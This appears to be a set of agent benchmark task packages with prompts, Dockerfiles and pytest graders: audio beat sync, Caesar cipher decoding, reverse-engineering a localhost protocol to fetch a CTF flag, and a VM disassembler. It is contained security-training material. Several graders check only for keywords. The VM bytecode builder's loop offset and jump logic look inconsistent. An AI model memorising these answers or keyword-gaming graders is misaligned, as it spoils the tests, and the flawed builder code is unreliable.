    result = subprocess.run([sys.executable, ""/app/minijs.py"", ""/tmp/test_closure.js""], 
                          capture_output=True, text=True)
    
    assert result.returncode == 0, f""Closure test failed: {result.stderr}""
    assert ""42"" in result.stdout, f""Closure did not capture variable correctly: {result.stdout}""

def test_test_programs_execute():
    """"""All test programs execute with correct output. Total: 1.0""""""
    # Check that test directory exists
    assert os.path.exists(""/app/minijs_tests/""), ""Test directory /app/minijs_tests/ must exist""
    
    # Define expected outputs for each test file
    expected_outputs = {
        ""basic_variables.js"": ""15"",  # 5 + 10
        ""basic_function.js"": ""7"",    # add(3, 4)
        ""closure_test.js"": ""42"",     # closure returns captured value
        ""if_else.js"": ""x is less than 5"",  # x=1 < 5
        ""while_loop.js"": [""0"", ""1"", ""2""],  # prints 0, 1, 2
        ""higher_order.js"": ""8"",      # makeAdder(5)(3) = 8
        ""lexical_scope.js"": ""20""     # inner function returns local x=20
    }
    
    # Execute each test program and verify output
    for filename, expected in expected_outputs.items():
        test_file = os.path.join(""/app/minijs_tests/"", filename)
        assert os.path.exists(test_file), f""Test file {test_file} must exist""
        
        result = subprocess.run([sys.executable, ""/app/minijs.py"", test_file], 
                              capture_output=True, text=True)
        assert result.returncode == 0, f""Test program {test_file} failed to execute: {result.stderr}""
        
        # Check output contains expected value(s)
        if isinstance(expected, list):
            for exp in expected:
                assert exp in result.stdout, f""{filename}: Expected '{exp}' in output, got: {result.stdout}""
        else:
            assert expected in result.stdout, f""{filename}: Expected '{expected}' in output, got: {result.stdout}""","{""test_parser_builds_ast"": 0.2, ""test_lexical_scoping_closures"": 0.3, ""test_test_programs_execute"": 0.5}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
beat-detection-audio-sync,medium,Beat Detection and Audio Sync,Reverse Engineering & Discovery,"I have two DJ mix recordings that overlap but aren't synchronized, and I need your help creating a Python script to fix this. Could you create a file called `beat_sync.py` that can detect the BPM of each track, find where they overlap, and then align them based on beat matching? I want it to output a synchronized mix when it's done. For the beat detection, please use `librosa` or FFT-based analysis - whichever works best for this kind of audio processing.",software-engineering,python|algorithms|audio-processing|signal-processing|synchronization,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

RUN pip install numpy scipy librosa

# Create Python script to generate audio files
RUN echo 'import numpy as np' > /app/create_audio.py && \
    echo 'import scipy.io.wavfile as wavfile' >> /app/create_audio.py && \
    echo '' >> /app/create_audio.py && \
    echo '# Create overlapping audio content with beats/rhythm' >> /app/create_audio.py && \
    echo 'sample_rate = 44100' >> /app/create_audio.py && \
    echo 'duration = 4.0' >> /app/create_audio.py && \
    echo 't = np.linspace(0, duration, int(sample_rate * duration))' >> /app/create_audio.py && \
    echo '' >> /app/create_audio.py && \
    echo '# Function to create beat pattern' >> /app/create_audio.py && \
    echo 'def create_beat_pattern(bpm, duration, sample_rate):' >> /app/create_audio.py && \
    echo '    beat_interval = 60.0 / bpm  # seconds per beat' >> /app/create_audio.py && \
    echo '    num_beats = int(duration / beat_interval)' >> /app/create_audio.py && \
    echo '    audio = np.zeros(int(sample_rate * duration))' >> /app/create_audio.py && \
    echo '    ' >> /app/create_audio.py && \
    echo '    for i in range(num_beats):' >> /app/create_audio.py && \
    echo '        beat_start = int(i * beat_interval * sample_rate)' >> /app/create_audio.py && \
    echo '        beat_length = int(0.1 * sample_rate)  # 100ms beat duration' >> /app/create_audio.py && \
    echo '        if beat_start + beat_length < len(audio):' >> /app/create_audio.py && \
    echo '            # Create kick drum-like sound' >> /app/create_audio.py && \
    echo '            beat_t = np.linspace(0, 0.1, beat_length)' >> /app/create_audio.py && \
    echo '            kick = np.sin(2 * np.pi * 60 * beat_t) * np.exp(-beat_t * 30)' >> /app/create_audio.py && \
    echo '            # Add hi-hat on off-beats' >> /app/create_audio.py && \
    echo '            if i % 2 == 1:' >> /app/create_audio.py && \
    echo '                hihat = np.random.normal(0, 0.1, beat_length) * np.exp(-beat_t * 50)' >> /app/create_audio.py && \
    echo '                kick += hihat * 0.3' >> /app/create_audio.py && \
    echo '            audio[beat_start:beat_start + beat_length] += kick' >> /app/create_audio.py && \
    echo '    ' >> /app/create_audio.py && \
    echo '    return audio' >> /app/create_audio.py && \
    echo '' >> /app/create_audio.py && \
    echo '# mix1.wav: 120 BPM with overlapping section at 880Hz' >> /app/create_audio.py && \
    echo 'mix1_beats = create_beat_pattern(120, duration, sample_rate)' >> /app/create_audio.py && \
    echo '# Add 880Hz tone in the middle section for overlap detection' >> /app/create_audio.py && \
    echo 'overlap_start = int(1.0 * sample_rate)' >> /app/create_audio.py && \
    echo 'overlap_end = int(3.0 * sample_rate)' >> /app/create_audio.py && \
    echo 'overlap_tone = 0.2 * np.sin(2 * np.pi * 880 * t[overlap_start:overlap_end])' >> /app/create_audio.py && \
    echo 'mix1_beats[overlap_start:overlap_end] += overlap_tone' >> /app/create_audio.py && \
    echo 'mix1 = (np.clip(mix1_beats, -1, 1) * 32767).astype(np.int16)' >> /app/create_audio.py && \
    echo '' >> /app/create_audio.py && \
    echo '# mix2.wav: 125 BPM with same overlapping section at 880Hz' >> /app/create_audio.py && \
    echo 'mix2_beats = create_beat_pattern(125, duration, sample_rate)' >> /app/create_audio.py && \
    echo '# Add same 880Hz tone for overlap detection' >> /app/create_audio.py && \
    echo 'mix2_beats[overlap_start:overlap_end] += overlap_tone' >> /app/create_audio.py && \
    echo 'mix2 = (np.clip(mix2_beats, -1, 1) * 32767).astype(np.int16)' >> /app/create_audio.py && \
    echo '' >> /app/create_audio.py && \
    echo 'wavfile.write(""/app/mix1.wav"", sample_rate, mix1)' >> /app/create_audio.py && \
    echo 'wavfile.write(""/app/mix2.wav"", sample_rate, mix2)' >> /app/create_audio.py

# Run the script to create audio files
RUN python3 /app/create_audio.py

CMD [""/bin/bash""]","import os
import subprocess
import numpy as np
import scipy.io.wavfile as wavfile
import librosa

def test_bpm_detection_accurate():
    """"""BPM detection is accurate within 1 BPM.""""""
    # Check if beat_sync.py exists
    assert os.path.exists(""/app/beat_sync.py"")
    
    # Run the script and capture output
    result = subprocess.run(
        [""python3"", ""/app/beat_sync.py""], 
        capture_output=True, text=True, cwd=""/app""
    )
    
    # Check if script runs successfully
    assert result.returncode == 0
    
    # Parse BPM values from output
    output_lines = result.stdout.split('\n')
    bpm_values = []
    
    for line in output_lines:
        # Look for BPM values in various formats
        if 'bpm' in line.lower():
            # Extract numbers from the line
            import re
            numbers = re.findall(r'\d+(?:\.\d+)?', line)
            for num in numbers:
                val = float(num)
                if 100 <= val <= 150:  # Reasonable BPM range
                    bpm_values.append(val)
    
    # Verify we detected BPMs close to expected values (120 and 125)
    expected_bpms = [120, 125]
    assert len(bpm_values) >= 2, f""Expected at least 2 BPM values, got {len(bpm_values)}""
    
    # Check if detected BPMs are within 1 BPM of expected
    for expected in expected_bpms:
        close_match = any(abs(detected - expected) <= 1 for detected in bpm_values)
        assert close_match, f""No BPM detected within 1 of expected {expected}. Detected: {bpm_values}""

def test_overlap_detection_correct():
    """"""Overlap detection correctly identifies common sections.""""""
    # Check if beat_sync.py exists
    assert os.path.exists(""/app/beat_sync.py"")
    
    # Run the script and capture output
    result = subprocess.run(
        [""python3"", ""/app/beat_sync.py""], 
        capture_output=True, text=True, cwd=""/app""
    )
    
    # Check if script runs successfully
    assert result.returncode == 0
    
    # Load audio files to verify overlap detection
    sr1, audio1 = wavfile.read(""/app/mix1.wav"")
    sr2, audio2 = wavfile.read(""/app/mix2.wav"")
    
    # Convert to float
    audio1 = audio1.astype(np.float32) / 32767.0
    audio2 = audio2.astype(np.float32) / 32767.0
    
    # The overlap should be detected around the 880Hz tone section (1.0s to 3.0s)
    expected_overlap_start = int(1.0 * sr1)
    expected_overlap_end = int(3.0 * sr1)
    
    # Check if the script mentions timing information or detects the overlap
    output = result.stdout.lower()
    has_timing_info = any(keyword in output for keyword in ['second', 'time', '1.', '2.', '3.', 'overlap', 'match'])
    
    # Alternative: check if 880Hz frequency is mentioned or detected
    has_frequency_info = '880' in output or 'hz' in output or 'frequency' in output
    
    assert has_timing_info or has_frequency_info, ""No overlap detection information found in output""

def test_beat_alignment_synchronized():
    """"""Beat alignment produces a properly synchronized output.""""""
    # Check if beat_sync.py exists
    assert os.path.exists(""/app/beat_sync.py"")
    
    # Run the script
    result = subprocess.run(
        [""python3"", ""/app/beat_sync.py""], 
        capture_output=True, text=True, cwd=""/app""
    )
    
    # Check if script runs successfully
    assert result.returncode == 0
    
    # Check if synchronized output file is created
    output_files = [
        ""/app/synchronized_mix.wav"",
        ""/app/sync_output.wav"", 
        ""/app/aligned_mix.wav"",
        ""/app/output.wav""
    ]
    
    output_file = None
    for f in output_files:
        if os.path.exists(f):
            output_file = f
            break
    
    assert output_file is not None, ""No synchronized output file found""
    
    # Load and verify the synchronized output
    sr, sync_audio = wavfile.read(output_file)
    assert len(sync_audio) > 0, ""Synchronized output file is empty""
    
    # Verify the output is longer than individual inputs (should be concatenated/merged)
    sr1, audio1 = wavfile.read(""/app/mix1.wav"")
    sr2, audio2 = wavfile.read(""/app/mix2.wav"")
    
    # The synchronized output should be at least as long as the longer input
    min_expected_length = max(len(audio1), len(audio2))
    assert len(sync_audio) >= min_expected_length * 0.8, ""Synchronized output seems too short""","{""test_bpm_detection_accurate"": 0.33, ""test_overlap_detection_correct"": 0.33, ""test_beat_alignment_synchronized"": 0.34}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
security-simple-cipher-decode,easy,Decode a Simple Cipher,Learning Under Pressure (Revised),"I've got a problem with an encoded file that I need your help with. There's an encoded message sitting in `/app/secret.enc` that I need to decode, but here's the thing - I only have the encoder binary at `/app/encoder` and no decoder. I need you to figure out how the encoding actually works by experimenting with the encoder tool, then write a decoder script that can recover the original message. Once you've got it working, please save the decoded message to `/app/decoded.txt`. Can you help me reverse engineer this encoding and get that message back?",security,security|decrypt|algorithm-implementation|file-operations|debugging|analysis,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

WORKDIR /app

# Install gcc to compile the encoder
RUN apt-get update && apt-get install -y gcc && rm -rf /var/lib/apt/lists/*

# Create encoder source code
RUN printf '#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nint main(int argc, char *argv[]) {\n    if (argc != 3) {\n        fprintf(stderr, ""Usage: %%s <input_file> <output_file>\\n"", argv[0]);\n        return 1;\n    }\n    FILE *input = fopen(argv[1], ""r"");\n    FILE *output = fopen(argv[2], ""w"");\n    if (!input || !output) {\n        fprintf(stderr, ""Error opening files\\n"");\n        return 1;\n    }\n    int c;\n    while ((c = fgetc(input)) != EOF) {\n        if (c >= 0x61 && c <= 0x7a) {\n            c = ((c - 0x61 + 3) %% 26) + 0x61;\n        } else if (c >= 0x41 && c <= 0x5a) {\n            c = ((c - 0x41 + 3) %% 26) + 0x41;\n        }\n        fputc(c, output);\n    }\n    fclose(input);\n    fclose(output);\n    return 0;\n}' > encoder.c

# Compile the encoder binary
RUN gcc -o encoder encoder.c

# Remove source code, keeping only the binary
RUN rm encoder.c

# Create the encoded file
RUN echo ""Wklv lv d vhfuhw phvvdjh"" > /app/secret.enc

CMD [""/bin/bash""]","import os
import subprocess

def test_encoding_scheme_identified():
    """"""The encoding scheme is correctly identified through experimentation.""""""
    # Check if there's evidence the Caesar cipher with shift 3 was identified
    # This can be verified by checking if a working decoder exists that implements the reverse
    decoder_exists = False
    correct_scheme = False
    
    # Look for common decoder filenames
    possible_decoders = ['/app/decoder', '/app/decoder.py', '/app/decode.py', '/app/decoder.sh']
    
    for decoder_path in possible_decoders:
        if os.path.exists(decoder_path):
            decoder_exists = True
            break
    
    # If decoded.txt exists with correct content, the scheme was identified
    if os.path.exists('/app/decoded.txt'):
        with open('/app/decoded.txt', 'r') as f:
            content = f.read().strip()
            if content == ""This is a secret message"":
                correct_scheme = True
    
    assert decoder_exists or correct_scheme

def test_decoder_implemented():
    """"""A working decoder is implemented.""""""
    # Check if a decoder script/program exists and is executable
    decoder_found = False
    possible_decoders = ['/app/decoder', '/app/decoder.py', '/app/decode.py', '/app/decoder.sh']
    
    for decoder_path in possible_decoders:
        if os.path.exists(decoder_path):
            if decoder_path.endswith('.py') or decoder_path.endswith('.sh') or os.access(decoder_path, os.X_OK):
                decoder_found = True
                break
    
    # Alternative: if decoded.txt exists with correct content, a working decoder was used
    if not decoder_found and os.path.exists('/app/decoded.txt'):
        with open('/app/decoded.txt', 'r') as f:
            content = f.read().strip()
            if content == ""This is a secret message"":
                decoder_found = True
    
    assert decoder_found

def test_secret_message_decoded():
    """"""The secret message is correctly decoded.""""""
    # Check if /app/decoded.txt exists and contains the correct decoded message
    assert os.path.exists('/app/decoded.txt')
    
    with open('/app/decoded.txt', 'r') as f:
        decoded_content = f.read().strip()
    
    # The original message should be ""This is a secret message"" 
    # (Caesar cipher with shift 3 reversed)
    assert decoded_content == ""This is a secret message""","{""test_encoding_scheme_identified"": 0.2, ""test_decoder_implemented"": 0.3, ""test_secret_message_decoded"": 0.5}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
security-unknown-network-protocol-reverse-engineering,medium,Unknown Network Protocol,Learning Under Pressure (Revised),"I have a service running on localhost:8888 that's using some protocol I'm not familiar with. I need you to help me figure out what this protocol is all about through experimentation. Specifically, I want to understand the protocol structure, what commands are available, and how authentication works. Once we've figured that out, I need you to write a Python client that can connect to this service and retrieve a flag that's stored on the server. Also, please document everything you discover about the protocol in a file at /app/protocol_spec.md so I have a reference for later.",security,networking|security|python|analysis|cli,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

RUN apt-get update && apt-get install -y \
    netcat-openbsd \
    tcpdump \
    && rm -rf /var/lib/apt/lists/*

RUN mkdir -p /app

# Create the protocol server script using base64
RUN echo 'I1whL3Vzci9iaW4vZW52IHB5dGhvbjMKaW1wb3J0IHNvY2tldAppbXBvcnQgdGhyZWFkaW5nCmltcG9ydCB0aW1lCmltcG9ydCBoYXNobGliCgpjbGFzcyBDdXN0b21Qcm90b2NvbFNlcnZlcjoKICAgIGRlZiBfX2luaXRfXyhzZWxmLCBob3N0PSdsb2NhbGhvc3QnLCBwb3J0PTg4ODgpOgogICAgICAgIHNlbGYuaG9zdCA9IGhvc3QKICAgICAgICBzZWxmLnBvcnQgPSBwb3J0CiAgICAgICAgc2VsZi51c2VycyA9IHsnYWRtaW4nOiAnc2VjcmV0MTIzJywgJ2d1ZXN0JzogJ2d1ZXN0J30KICAgICAgICBzZWxmLmZsYWcgPSAnRkxBR3tyM3YzcnMzXzNuZzFuMzNyMW5nX200c3Qzcn0nCiAgICAgICAgCiAgICBkZWYgaGFuZGxlX2NsaWVudChzZWxmLCBjb25uLCBhZGRyKToKICAgICAgICBhdXRoZW50aWNhdGVkID0gRmFsc2UKICAgICAgICB1c2VybmFtZSA9IE5vbmUKICAgICAgICAKICAgICAgICB0cnk6CiAgICAgICAgICAgICMgU2VuZCBwcm90b2NvbCBiYW5uZXIKICAgICAgICAgICAgY29ubi5zZW5kKGIiQ1VTVFBST1RPLzEuMCBSRUFEWVxyXG4iKQogICAgICAgICAgICAKICAgICAgICAgICAgd2hpbGUgVHJ1ZToKICAgICAgICAgICAgICAgIGRhdGEgPSBjb25uLnJlY3YoMTAyNCkKICAgICAgICAgICAgICAgIGlmIG5vdCBkYXRhOgogICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBjb21tYW5kID0gZGF0YS5kZWNvZGUoKS5zdHJpcCgpCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGlmIGNvbW1hbmQuc3RhcnRzd2l0aCgnQVVUSCAnKToKICAgICAgICAgICAgICAgICAgICAjIEFVVEggdXNlcm5hbWU6cGFzc3dvcmQKICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgIGNyZWRzID0gY29tbWFuZFs1Ol0KICAgICAgICAgICAgICAgICAgICAgICAgdXNlciwgcGFzc3dvcmQgPSBjcmVkcy5zcGxpdCgnOicpCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIHVzZXIgaW4gc2VsZi51c2VycyBhbmQgc2VsZi51c2Vyc1t1c2VyXSA9PSBwYXNzd29yZDoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGF1dGhlbnRpY2F0ZWQgPSBUcnVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB1c2VybmFtZSA9IHVzZXIKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbm4uc2VuZChiIkFVVEhfT0tcclxuIikKICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbm4uc2VuZChiIkFVVEhfRkFJTFxyXG4iKQogICAgICAgICAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgICAgICAgICAgY29ubi5zZW5kKGIiQVVUSF9FUlJPUlxyXG4iKQogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGVsaWYgY29tbWFuZCA9PSAnSEVMUCc6CiAgICAgICAgICAgICAgICAgICAgaGVscF9tc2cgPSBiIkNPTU1BTkRTOiBBVVRILCBIRUxQLCBTVEFUVVMsIEZMQUcsIFFVSVRcclxuIgogICAgICAgICAgICAgICAgICAgIGNvbm4uc2VuZChoZWxwX21zZykKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGVsaWYgY29tbWFuZCA9PSAnU1RBVFVTJzoKICAgICAgICAgICAgICAgICAgICBpZiBhdXRoZW50aWNhdGVkOgogICAgICAgICAgICAgICAgICAgICAgICBzdGF0dXMgPSBmIlNUQVRVU19PSyBVU0VSOnt1c2VybmFtZX1cclxuIgogICAgICAgICAgICAgICAgICAgICAgICBjb25uLnNlbmQoc3RhdHVzLmVuY29kZSgpKQogICAgICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICAgIGNvbm4uc2VuZChiIlNUQVRVU19VTkFVVEhcclxuIikKICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBlbGlmIGNvbW1hbmQgPT0gJ0ZMQUcnOgogICAgICAgICAgICAgICAgICAgIGlmIGF1dGhlbnRpY2F0ZWQgYW5kIHVzZXJuYW1lID09ICdhZG1pbic6CiAgICAgICAgICAgICAgICAgICAgICAgIGZsYWdfbXNnID0gZiJGTEFHX0RBVEEge3NlbGYuZmxhZ31cclxuIgogICAgICAgICAgICAgICAgICAgICAgICBjb25uLnNlbmQoZmxhZ19tc2cuZW5jb2RlKCkpCiAgICAgICAgICAgICAgICAgICAgZWxpZiBhdXRoZW50aWNhdGVkOgogICAgICAgICAgICAgICAgICAgICAgICBjb25uLnNlbmQoYiJGTEFHX0RFTklFRCBJTlNVRkZJQ0lFTlRfUFJJVklMRUdFU1xyXG4iKQogICAgICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICAgIGNvbm4uc2VuZChiIkZMQUdfREVOSUVEIE5PVF9BVVRIRU5USUNBVEVEXHJcbiIpCiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgZWxpZiBjb21tYW5kID09ICdRVUlUJzoKICAgICAgICAgICAgICAgICAgICBjb25uLnNlbmQoYiJCWUVcclxuIikKICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBjb25uLnNlbmQoYiJVTktOT1dOX0NPTU1BTkRcclxuIikKICAgICAgICAgICAgICAgICAgICAKICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgIHBhc3MKICAgICAgICBmaW5hbGx5OgogICAgICAgICAgICBjb25uLmNsb3NlKCkKICAgIAogICAgZGVmIHN0YXJ0KHNlbGYpOgogICAgICAgIHNvY2sgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pCiAgICAgICAgc29jay5zZXRzb2Nrb3B0KHNvY2tldC5TT0xfU09DS0VULCBzb2NrZXQuU09fUkVVU0VBRERSLCAxKQogICAgICAgIHNvY2suYmluZCgoc2VsZi5ob3N0LCBzZWxmLnBvcnQpKQogICAgICAgIHNvY2subGlzdGVuKDUpCiAgICAgICAgCiAgICAgICAgcHJpbnQoZiJDdXN0b20gUHJvdG9jb2wgU2VydmVyIGxpc3RlbmluZyBvbiB7c2VsZi5ob3N0fTp7c2VsZi5wb3J0fSIpCiAgICAgICAgCiAgICAgICAgd2hpbGUgVHJ1ZToKICAgICAgICAgICAgY29ubiwgYWRkciA9IHNvY2suYWNjZXB0KCkKICAgICAgICAgICAgY2xpZW50X3RocmVhZCA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PXNlbGYuaGFuZGxlX2NsaWVudCwgYXJncz0oY29ubiwgYWRkcikpCiAgICAgICAgICAgIGNsaWVudF90aHJlYWQuZGFlbW9uID0gVHJ1ZQogICAgICAgICAgICBjbGllbnRfdGhyZWFkLnN0YXJ0KCkKCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6CiAgICBzZXJ2ZXIgPSBDdXN0b21Qcm90b2NvbFNlcnZlcigpCiAgICBzZXJ2ZXIuc3RhcnQoKQo=' | base64 -d > /app/protocol_server.py

RUN chmod +x /app/protocol_server.py

WORKDIR /app

EXPOSE 8888

CMD [""bash"", ""-c"", ""python3 /app/protocol_server.py & bash""]","import os
import subprocess
import pathlib

def test_protocol_structure_discovered():
    """"""Protocol structure is correctly reverse engineered.""""""
    # Check if protocol documentation exists
    assert os.path.exists(""/app/protocol_spec.md""), ""Protocol specification file not found""
    
    # Check if the documentation contains protocol structure details
    with open(""/app/protocol_spec.md"", ""r"") as f:
        content = f.read().lower()
    
    # Verify documentation contains key protocol elements
    assert ""protocol"" in content, ""Protocol documentation missing protocol details""
    assert ""structure"" in content or ""format"" in content, ""Protocol structure not documented""

def test_authentication_implemented():
    """"""Authentication mechanism is discovered and implemented.""""""
    # Check if protocol documentation mentions authentication
    assert os.path.exists(""/app/protocol_spec.md""), ""Protocol specification file not found""
    
    with open(""/app/protocol_spec.md"", ""r"") as f:
        content = f.read().lower()
    
    # Verify authentication is documented and implemented
    assert ""authentication"" in content or ""auth"" in content, ""Authentication mechanism not documented""
    
    # Check if there's a client implementation that handles authentication
    python_files = list(pathlib.Path(""/app"").glob(""*.py""))
    assert len(python_files) > 0, ""No Python client implementation found""
    
    # Check if any Python file contains authentication logic
    auth_implemented = False
    for py_file in python_files:
        with open(py_file, ""r"") as f:
            py_content = f.read().lower()
            if ""auth"" in py_content or ""login"" in py_content or ""password"" in py_content:
                auth_implemented = True
                break
    
    assert auth_implemented, ""Authentication not implemented in client code""

def test_flag_retrieved_documented():
    """"""Client successfully retrieves the flag and protocol is documented.""""""
    # Check if protocol is documented
    assert os.path.exists(""/app/protocol_spec.md""), ""Protocol specification file not found""
    
    # Check if there's a client that can retrieve the flag
    python_files = list(pathlib.Path(""/app"").glob(""*.py""))
    assert len(python_files) > 0, ""No Python client found""
    
    # Check if any client mentions flag retrieval
    flag_client_exists = False
    for py_file in python_files:
        with open(py_file, ""r"") as f:
            py_content = f.read().lower()
            if ""flag"" in py_content:
                flag_client_exists = True
                break
    
    assert flag_client_exists, ""No client code found that retrieves flags""
    
    # Verify the protocol documentation is comprehensive
    with open(""/app/protocol_spec.md"", ""r"") as f:
        content = f.read()
    
    assert len(content.strip()) > 100, ""Protocol documentation is too brief""
    assert ""flag"" in content.lower(), ""Flag retrieval not documented in protocol specification""","{""test_protocol_structure_discovered"": 0.25, ""test_authentication_implemented"": 0.35, ""test_flag_retrieved_documented"": 0.4}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
vm-bytecode-disassembler,hard,VM Bytecode Disassembler,Learning Under Pressure (Revised),"I've discovered there's a custom virtual machine located at `/app/vm` that can execute bytecode files, and there's an intriguing program at `/app/program.vm` that I'd like to understand. I need you to reverse engineer this VM's instruction set by creating test programs and observing how they behave, and if necessary, analyze the VM binary itself. Once you've figured out the instruction set, I want you to build a disassembler that can convert the bytecode into readable assembly code. Finally, I need you to determine what the `program.vm` file actually does and provide clear documentation of its functionality.",security,debugging|security|analysis|algorithms|system,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

# Install standard reverse engineering tools and build tools
RUN apt-get update && apt-get install -y \
    binutils \
    util-linux \
    file \
    build-essential \
    gcc \
    python3 \
    && rm -rf /var/lib/apt/lists/*

# Create proper VM implementation source
COPY <<'VMCODE' /tmp/vm.c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

#define STACK_SIZE 256
#define MEMORY_SIZE 1024

typedef struct {
    int32_t stack[STACK_SIZE];
    int sp;
    int32_t memory[MEMORY_SIZE];
    int pc;
    uint8_t *code;
    int code_size;
} VM;

// Opcodes
#define OP_NOP     0x00
#define OP_PUSH    0x01  // PUSH <4-byte value>
#define OP_POP     0x02
#define OP_ADD     0x03
#define OP_SUB     0x04
#define OP_MUL     0x05
#define OP_LOAD    0x06  // LOAD <4-byte addr>
#define OP_STORE   0x07  // STORE <4-byte addr>
#define OP_JMP     0x08  // JMP <4-byte addr>
#define OP_JEQ     0x09  // JEQ <4-byte addr>
#define OP_PRINT   0x0A
#define OP_HALT    0xFF

int32_t read_int32(VM *vm) {
    if (vm->pc + 4 > vm->code_size) return 0;
    int32_t val = *(int32_t*)(vm->code + vm->pc);
    vm->pc += 4;
    return val;
}

void push(VM *vm, int32_t val) {
    if (vm->sp < STACK_SIZE) {
        vm->stack[vm->sp++] = val;
    }
}

int32_t pop(VM *vm) {
    if (vm->sp > 0) {
        return vm->stack[--vm->sp];
    }
    return 0;
}

void execute(VM *vm) {
    while (vm->pc < vm->code_size) {
        uint8_t opcode = vm->code[vm->pc++];
        
        switch (opcode) {
            case OP_NOP:
                break;
            case OP_PUSH: {
                int32_t val = read_int32(vm);
                push(vm, val);
                break;
            }
            case OP_POP:
                pop(vm);
                break;
            case OP_ADD: {
                int32_t b = pop(vm);
                int32_t a = pop(vm);
                push(vm, a + b);
                break;
            }
            case OP_SUB: {
                int32_t b = pop(vm);
                int32_t a = pop(vm);
                push(vm, a - b);
                break;
            }
            case OP_MUL: {
                int32_t b = pop(vm);
                int32_t a = pop(vm);
                push(vm, a * b);
                break;
            }
            case OP_LOAD: {
                int32_t addr = read_int32(vm);
                if (addr >= 0 && addr < MEMORY_SIZE) {
                    push(vm, vm->memory[addr]);
                }
                break;
            }
            case OP_STORE: {
                int32_t addr = read_int32(vm);
                int32_t val = pop(vm);
                if (addr >= 0 && addr < MEMORY_SIZE) {
                    vm->memory[addr] = val;
                }
                break;
            }
            case OP_JMP: {
                int32_t addr = read_int32(vm);
                if (addr >= 0 && addr < vm->code_size) {
                    vm->pc = addr;
                }
                break;
            }
            case OP_JEQ: {
                int32_t addr = read_int32(vm);
                int32_t val = pop(vm);
                if (val == 0 && addr >= 0 && addr < vm->code_size) {
                    vm->pc = addr;
                }
                break;
            }
            case OP_PRINT: {
                int32_t val = pop(vm);
                printf(""%d\n"", val);
                break;
            }
            case OP_HALT:
                return;
        }
    }
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf(""Usage: vm <bytecode_file>\n"");
        return 1;
    }
    
    FILE *file = fopen(argv[1], ""rb"");
    if (!file) {
        printf(""Error: File %s not found\n"", argv[1]);
        return 1;
    }
    
    fseek(file, 0, SEEK_END);
    int size = ftell(file);
    fseek(file, 0, SEEK_SET);
    
    uint8_t *code = malloc(size);
    fread(code, 1, size, file);
    fclose(file);
    
    VM vm = {0};
    vm.code = code;
    vm.code_size = size;
    vm.sp = 0;
    vm.pc = 0;
    
    execute(&vm);
    
    free(code);
    return 0;
}
VMCODE

# Compile the VM
RUN gcc -o /usr/local/bin/vm /tmp/vm.c && rm /tmp/vm.c

# Create directories
RUN mkdir -p /app

# Create VM symlink
RUN ln -s /usr/local/bin/vm /app/vm

# Create a more interesting bytecode program that calculates sum of 1 to 10
COPY <<'PYCODE' /tmp/create_program.py
import struct
bytecode = bytearray()
# Initialize counter to 1
bytecode.extend([0x01])  # PUSH
bytecode.extend(struct.pack('<i', 1))
bytecode.extend([0x07])  # STORE
bytecode.extend(struct.pack('<i', 0))  # at address 0
# Initialize sum to 0  
bytecode.extend([0x01])  # PUSH
bytecode.extend(struct.pack('<i', 0))
bytecode.extend([0x07])  # STORE
bytecode.extend(struct.pack('<i', 1))  # at address 1
# Loop start (offset 26)
# Load counter
bytecode.extend([0x06])  # LOAD
bytecode.extend(struct.pack('<i', 0))
# Load sum
bytecode.extend([0x06])  # LOAD  
bytecode.extend(struct.pack('<i', 1))
# Add them
bytecode.extend([0x03])  # ADD
# Store back to sum
bytecode.extend([0x07])  # STORE
bytecode.extend(struct.pack('<i', 1))
# Increment counter
bytecode.extend([0x06])  # LOAD
bytecode.extend(struct.pack('<i', 0))
bytecode.extend([0x01])  # PUSH
bytecode.extend(struct.pack('<i', 1))
bytecode.extend([0x03])  # ADD
# Store counter
bytecode.extend([0x07])  # STORE
bytecode.extend(struct.pack('<i', 0))
# Check if counter > 10
bytecode.extend([0x06])  # LOAD counter
bytecode.extend(struct.pack('<i', 0))
bytecode.extend([0x01])  # PUSH
bytecode.extend(struct.pack('<i', 11))
bytecode.extend([0x04])  # SUB
bytecode.extend([0x09])  # JEQ (jump if zero)
bytecode.extend(struct.pack('<i', 26))  # back to loop start
# Print result
bytecode.extend([0x06])  # LOAD sum
bytecode.extend(struct.pack('<i', 1))
